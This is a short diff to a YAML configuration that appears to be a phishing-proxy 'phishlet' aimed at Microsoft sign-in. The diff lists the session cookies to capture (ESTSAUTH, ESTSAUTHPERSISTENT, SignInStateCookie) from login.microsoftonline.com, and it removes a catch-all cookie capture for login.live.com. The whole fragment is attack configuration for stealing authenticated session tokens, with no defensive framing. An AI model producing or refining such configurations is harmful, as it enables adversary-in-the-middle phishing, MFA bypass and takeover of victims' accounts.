@@ -17,11 +17,7 @@ auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
   - domain: 'login.microsoftonline.com'
-    keys: ['SignInStateCookie']
-  - domain: 'login.live.com'
-    keys: ['.*,regexp']    
-  - domain: '.login.live.com'
-    keys: ['.*,regexp']      
+    keys: ['SignInStateCookie']    
 auth_urls:
  - '/kmsi*'
 credentials:
